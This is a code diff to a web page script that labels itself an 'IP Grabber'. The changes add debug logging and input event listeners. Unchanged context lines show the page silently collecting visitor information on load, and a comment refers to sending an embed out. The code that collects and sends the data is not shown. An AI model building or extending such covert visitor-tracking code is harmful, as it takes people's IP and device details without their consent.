@@ -7,12 +7,16 @@ let nameSubmitted = false;
 
 // Function to submit name and send white embed
 async function submitName() {
-    console.log('Submit name function called');
+    console.log('=== SUBMIT NAME FUNCTION CALLED ===');
     
     const nameInput = document.getElementById('nameInput');
+    console.log('Name input element:', nameInput);
+    
     const enteredName = nameInput ? nameInput.value.trim() : '';
+    console.log('Entered name value:', enteredName);
     
     if (!enteredName) {
+        console.log('No name entered, showing alert');
         alert('Please enter your name first!');
         return;
     }
@@ -23,12 +27,21 @@ async function submitName() {
     const showDetailsBtn = document.getElementById('showDetailsBtn');
     const enterNameBtn = document.getElementById('enterNameBtn');
     
+    console.log('Found elements:', {
+        showDetailsBtn: !!showDetailsBtn,
+        enterNameBtn: !!enterNameBtn
+    });
+    
     if (showDetailsBtn && enterNameBtn) {
+        console.log('Updating UI elements...');
         showDetailsBtn.style.display = 'flex';
         enterNameBtn.innerHTML = '<span class="btn-icon">✓</span>Name Entered';
         enterNameBtn.disabled = true;
         enterNameBtn.style.opacity = '0.6';
         enterNameBtn.style.cursor = 'not-allowed';
+        console.log('UI elements updated successfully');
+    } else {
+        console.error('Could not find required elements!');
     }
     
     nameSubmitted = true;
@@ -511,6 +524,10 @@ function displayUserInfo() {
     userDetails.style.display = 'block';
 }
 
+// Make function globally available for debugging
+window.submitName = submitName;
+window.testModal = testModal;
+
 // Automatically grab user info when the page loads
 document.addEventListener('DOMContentLoaded', function() {
     console.log('IP Grabber loaded successfully');
@@ -519,6 +536,30 @@ document.addEventListener('DOMContentLoaded', function() {
     setTimeout(() => {
         // Initialize modal functionality
         initializeModal();
+        
+        // Add backup event listener to Enter Name button
+        const enterNameBtn = document.getElementById('enterNameBtn');
+        if (enterNameBtn) {
+            console.log('Adding backup event listener to enter name button');
+            enterNameBtn.addEventListener('click', function(e) {
+                console.log('Backup event listener triggered');
+                e.preventDefault();
+                submitName();
+            });
+        }
+        
+        // Add Enter key functionality to input field
+        const nameInput = document.getElementById('nameInput');
+        if (nameInput) {
+            console.log('Adding Enter key listener to name input');
+            nameInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    console.log('Enter key pressed in name input');
+                    e.preventDefault();
+                    submitName();
+                }
+            });
+        }
         
         // Grab user info silently in background
         grabUserInfo();
